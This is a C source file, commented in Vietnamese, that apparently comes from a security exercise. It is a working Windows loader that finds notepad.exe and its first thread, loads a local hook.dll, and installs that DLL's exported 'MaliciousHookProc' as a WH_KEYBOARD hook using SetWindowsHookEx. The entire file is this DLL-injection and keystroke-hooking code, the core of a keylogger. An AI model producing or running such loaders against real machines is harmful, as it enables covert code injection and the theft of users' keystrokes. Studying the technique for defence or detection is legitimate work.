#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Tìm PID
DWORD GetProcessID(const char* procName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, procName) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return 0;
}

// Tìm Thread ID đầu tiên của Process
DWORD GetThreadID(DWORD pid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                CloseHandle(hSnapshot);
                return te.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te));
    }
    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    const char* dllPath = "C:\\Users\\DELL\\Downloads\\VCS\\hook.dll";

    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        return 1;
    }

    // Tìm Notepad
    DWORD pid = GetProcessID("notepad.exe");
    if (pid == 0) {
        return 1;
    }
    
    DWORD tid = GetThreadID(pid);

    // Load DLL để lấy địa chỉ hàm Hook
    HMODULE hDll = LoadLibraryA(dllPath);
    if (!hDll) {
        return 1;
    }

    HOOKPROC hookAddr = (HOOKPROC)GetProcAddress(hDll, "MaliciousHookProc");
    if (!hookAddr) {
        return 1;
    }

    // Cài đặt Hook
    // WH_KEYBOARD: Loại hook bàn phím
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD, hookAddr, hDll, tid);

    if (!hHook) {
        return 1;
    }

   // VÒNG LẶP TIN NHẮN (MESSAGE LOOP)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    FreeLibrary(hDll);
    return 0;
}